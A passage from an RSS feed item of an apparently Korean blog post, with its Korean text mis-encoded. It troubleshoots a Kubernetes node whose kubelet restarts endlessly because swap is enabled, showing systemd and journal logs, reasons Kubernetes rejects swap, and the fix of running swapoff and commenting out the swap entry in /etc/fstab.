https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/ for more information. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: Flag --pod-infra-container-image has been deprecated, will be removed in a future release. Image garbage collector will get sandbox image information from CRI. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.710817 150116 server.go:209] &amp;quot;--pod-infra-container-image will not be pruned by the image garbage collector in kubelet and should also be set in the remote runtime&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715367 150116 server.go:492] &amp;quot;Kubelet version&amp;quot; kubeletVersion=&amp;quot;v1.29.15&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715402 150116 server.go:494] &amp;quot;Golang settings&amp;quot; GOGC=&amp;quot;&amp;quot; GOMAXPROCS=&amp;quot;&amp;quot; GOTRACEBACK=&amp;quot;&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715759 150116 server.go:924] &amp;quot;Client rotation is on, will bootstrap in background&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.716990 150116 certificate_store.go:130] Loading cert/key pair from &amp;quot;/var/lib/kubelet/pki/kubelet-client-current.pem&amp;quot;. &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.718180 150116 dynamic_cafile_content.go:157] &amp;quot;Starting controller&amp;quot; name=&amp;quot;client-ca-bundle::/etc/kubernetes/pki/ca.crt&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.727293 150116 server.go:750] &amp;quot;--cgroups-per-qos enabled, but --cgroup-root was not specified. defaulting to /&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nov 23 10:53:04 kubelet[150116]: E1123 10:53:04.727405 150116 run.go:74] &amp;quot;command failed&amp;quot; err=&amp;quot;failed to run Kubelet: running with swap on is not supported, please disable swap! or set --fail-swap-on flag to false. /proc/s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;í•µì‹¬ ì—ëŸ¬ ë©”ì‹œì§€ëŠ” ì•„ë˜ í•œ ì¤„ì´ë‹¤.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;running with swap on is not supported, please disable swap!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ì¦‰, swap ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ kubeletì´ ì‹¤í–‰ë˜ê³  ìˆê¸° ë•Œë¬¸ì— ê°•ì œë¡œ ì¢…ë£Œë˜ê³  ìˆì—ˆë˜ ê²ƒì´ë‹¤. ì´ˆê¸° ì„¤ì •ë•Œ ê»ëŠ”ë°.. ì¬ì‹¤í–‰ë˜ë©´ì„œ ì¼œì§„ ëª¨ì–‘ì´ë‹¤. ğŸ˜­&lt;/p&gt;
&lt;h2 id=&quot;â—-Kubernetes-ëŠ”-ì™œ-swapì„-í—ˆìš©í•˜ì§€-ì•Šì„ê¹Œ&quot;&gt;&lt;a href=&quot;#â—-Kubernetes-ëŠ”-ì™œ-swapì„-í—ˆìš©í•˜ì§€-ì•Šì„ê¹Œ&quot; class=&quot;headerlink&quot; title=&quot;â— Kubernetes ëŠ” ì™œ swapì„ í—ˆìš©í•˜ì§€ ì•Šì„ê¹Œ?&quot;&gt;&lt;/a&gt;â— Kubernetes ëŠ” ì™œ swapì„ í—ˆìš©í•˜ì§€ ì•Šì„ê¹Œ?&lt;/h2&gt;&lt;p&gt;Kubernetes ëŠ” ë…¸ë“œ ë¦¬ì†ŒìŠ¤ë¥¼ ì—„ê²©í•˜ê²Œ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ë©”ëª¨ë¦¬ ê´€ë¦¬ ì •ì±…ì„ ìì²´ì ìœ¼ë¡œ ìˆ˜í–‰í•œë‹¤. í•˜ì§€ë§Œ swap ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/k8s/k8s.png"></p><p>ìµœê·¼ í™ˆ ì„œë²„ì— Kubernetes í´ëŸ¬ìŠ¤í„°ë¥¼ êµ¬ì„±í•˜ë˜ ì¤‘, ë…¸ë“œê°€ ì¬ì‹¤í–‰í•œ í›„ì— ë…¸ë“œê°€ NotReady ìƒíƒœë¡œ ë–¨ì–´ì§€ë©° kubelet ì´ ê³„ì† ì¬ì‹œì‘ë˜ëŠ” ë¬¸ì œë¥¼ ê²ªì—ˆë‹¤.<br>systemd ë¡œê·¸ë¥¼ í™•ì¸í•´ ë³´ë‹ˆ, kubelet ì´ ë¬´í•œ ì¬ì‹œì‘ë˜ë©° restart counter ê°€ 6500íšŒë¥¼ ë„˜ëŠ” ì‹¬ê°í•œ ìƒíƒœì˜€ë‹¤.</p><h2 id="ğŸ”-ë¬¸ì œ-ìƒí™©"><a href="#ğŸ”-ë¬¸ì œ-ìƒí™©" class="headerlink" title="ğŸ” ë¬¸ì œ ìƒí™©"></a>ğŸ” ë¬¸ì œ ìƒí™©</h2><p>ê³„ì† ì¬ì‹œì‘ ë˜ëŠ” ë…¸ë“œë¡œ ë“¤ì–´ê°€ì„œ kubelet ì„œë¹„ìŠ¤ ìƒíƒœë¥¼ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë©”ì‹œì§€ê°€ ë°˜ë³µì ìœ¼ë¡œ ì¶œë ¥ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sudo systemctl status kubelet</span><br><span class="line">â— kubelet.service - kubelet: The Kubernetes Node Agent</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; preset: enabled)</span><br><span class="line">    Drop-In: /usr/lib/systemd/system/kubelet.service.d</span><br><span class="line">             â””â”€10-kubeadm.conf</span><br><span class="line">     Active: activating (auto-restart) (Result: exit-code) since Sun 2025-11-23 10:52:13 KST; 1s ago</span><br><span class="line">       Docs: https://kubernetes.io/docs/</span><br><span class="line">    Process: 150004 ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS (code=exited, status=1/FAILURE)</span><br><span class="line">   Main PID: 150004 (code=exited, status=1/FAILURE)</span><br><span class="line">        CPU: 90ms</span><br><span class="line"></span><br><span class="line">&gt; sudo journalctl -u kubelet -n 50 --no-pager</span><br><span class="line">Nov 23 10:52:54 systemd[1]: kubelet.service: Main process exited, code=exited, status=1/FAILURE </span><br><span class="line">Nov 23 10:52:54 systemd[1]: kubelet.service: Failed with result &#x27;exit-code&#x27;. </span><br><span class="line">Nov 23 10:53:04 systemd[1]: kubelet.service: Scheduled restart job, restart counter is at 6578. </span><br><span class="line">Nov 23 10:53:04 systemd[1]: Started kubelet.service - kubelet: The Kubernetes Node Agent. </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: Flag --container-runtime-endpoint has been deprecated, This parameter should be set via the config file specified by the Kubelet&#x27;s --config flag. See https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/ for more information. </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: Flag --pod-infra-container-image has been deprecated, will be removed in a future release. Image garbage collector will get sandbox image information from CRI. </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.710817 150116 server.go:209] &quot;--pod-infra-container-image will not be pruned by the image garbage collector in kubelet and should also be set in the remote runtime&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715367 150116 server.go:492] &quot;Kubelet version&quot; kubeletVersion=&quot;v1.29.15&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715402 150116 server.go:494] &quot;Golang settings&quot; GOGC=&quot;&quot; GOMAXPROCS=&quot;&quot; GOTRACEBACK=&quot;&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.715759 150116 server.go:924] &quot;Client rotation is on, will bootstrap in background&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.716990 150116 certificate_store.go:130] Loading cert/key pair from &quot;/var/lib/kubelet/pki/kubelet-client-current.pem&quot;. </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.718180 150116 dynamic_cafile_content.go:157] &quot;Starting controller&quot; name=&quot;client-ca-bundle::/etc/kubernetes/pki/ca.crt&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: I1123 10:53:04.727293 150116 server.go:750] &quot;--cgroups-per-qos enabled, but --cgroup-root was not specified. defaulting to /&quot; </span><br><span class="line">Nov 23 10:53:04 kubelet[150116]: E1123 10:53:04.727405 150116 run.go:74] &quot;command failed&quot; err=&quot;failed to run Kubelet: running with swap on is not supported, please disable swap! or set --fail-swap-on flag to false. /proc/s</span><br></pre></td></tr></table></figure><p>í•µì‹¬ ì—ëŸ¬ ë©”ì‹œì§€ëŠ” ì•„ë˜ í•œ ì¤„ì´ë‹¤.</p><blockquote><p>running with swap on is not supported, please disable swap!</p></blockquote><p>ì¦‰, swap ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ kubeletì´ ì‹¤í–‰ë˜ê³  ìˆê¸° ë•Œë¬¸ì— ê°•ì œë¡œ ì¢…ë£Œë˜ê³  ìˆì—ˆë˜ ê²ƒì´ë‹¤. ì´ˆê¸° ì„¤ì •ë•Œ ê»ëŠ”ë°.. ì¬ì‹¤í–‰ë˜ë©´ì„œ ì¼œì§„ ëª¨ì–‘ì´ë‹¤. ğŸ˜­</p><h2 id="â—-Kubernetes-ëŠ”-ì™œ-swapì„-í—ˆìš©í•˜ì§€-ì•Šì„ê¹Œ"><a href="#â—-Kubernetes-ëŠ”-ì™œ-swapì„-í—ˆìš©í•˜ì§€-ì•Šì„ê¹Œ" class="headerlink" title="â— Kubernetes ëŠ” ì™œ swapì„ í—ˆìš©í•˜ì§€ ì•Šì„ê¹Œ?"></a>â— Kubernetes ëŠ” ì™œ swapì„ í—ˆìš©í•˜ì§€ ì•Šì„ê¹Œ?</h2><p>Kubernetes ëŠ” ë…¸ë“œ ë¦¬ì†ŒìŠ¤ë¥¼ ì—„ê²©í•˜ê²Œ ê´€ë¦¬í•˜ê¸° ìœ„í•´ ë©”ëª¨ë¦¬ ê´€ë¦¬ ì •ì±…ì„ ìì²´ì ìœ¼ë¡œ ìˆ˜í–‰í•œë‹¤. í•˜ì§€ë§Œ swap ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.</p><table><thead><tr><th>ë¬¸ì œ</th><th>ì„¤ëª…</th></tr></thead><tbody><tr><td>OOM íŒë‹¨ ë¶ˆê°€</td><td>ë©”ëª¨ë¦¬ê°€ ë¶€ì¡±í•´ë„ swapìœ¼ë¡œ ë¹ ì ¸ë‚˜ê°€ë©´ ì •í™•í•œ OOM íŒë‹¨ì´ ì–´ë ¤ì›€</td></tr><tr><td>ë¦¬ì†ŒìŠ¤ ì˜ˆì¸¡ ë¶ˆê°€</td><td>Podì˜ memory limitê°€ ë¬´ì˜ë¯¸í•´ì§</td></tr><tr><td>ì„±ëŠ¥ ì €í•˜</td><td>ë””ìŠ¤í¬ swap I&#x2F;Oë¡œ ì§€ì—° ë°œìƒ</td></tr><tr><td>ìŠ¤ì¼€ì¤„ë§ ì˜¤ë¥˜</td><td>ë…¸ë“œ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©ëŸ‰ì´ ì™œê³¡ë¨</td></tr></tbody></table><p>ê·¸ë˜ì„œ kubelet ì€ ê¸°ë³¸ì ìœ¼ë¡œ swap on ìƒíƒœì´ë©´ kubelet ì‹¤í–‰ì„ ê±°ë¶€í•©ë‹ˆë‹¤.</p><h2 id="âœ…-í•´ê²°-ë°©ë²•-swap-off"><a href="#âœ…-í•´ê²°-ë°©ë²•-swap-off" class="headerlink" title="âœ… í•´ê²° ë°©ë²• - swap off"></a>âœ… í•´ê²° ë°©ë²• - swap off</h2><p>í˜„ì¬ swap ìƒíƒœ í™•ì¸<br>ì•„ë˜ ëª…ë ¹ì–´ ì‹¤í–‰ì‹œ swap ì´ ë³´ì´ë©´ í™œì„±í™”ëœ ìƒíƒœë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">swapon --show</span><br><span class="line"><span class="comment"># ë˜ëŠ”</span></span><br><span class="line">free -h</span><br></pre></td></tr></table></figure><p>swap ì¦‰ì‹œ ë¹„í™œì„±í™”</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo swapoff -a</span><br></pre></td></tr></table></figure><p>ì¬ë¶€íŒ… í›„ì—ë„ swap ë¹„í™œì„±í™” ìœ ì§€ (ì˜êµ¬ ì„¤ì •)<br>&#x2F;etc&#x2F;fstab íŒŒì¼ì„ ì—´ì–´ swap í•­ëª©ì„ ì£¼ì„ ì²˜ë¦¬í•œë‹¤.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì•„ë˜ ë‚´ìš©ì„ ì£¼ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="comment">#/swap.img       none    swap    sw      0       0</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Kubernetes/">Kubernetes</category>
      
      
      
      <comments>https://ckck803.github.io/2025/11/27/k8s/kubernetes-swap/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
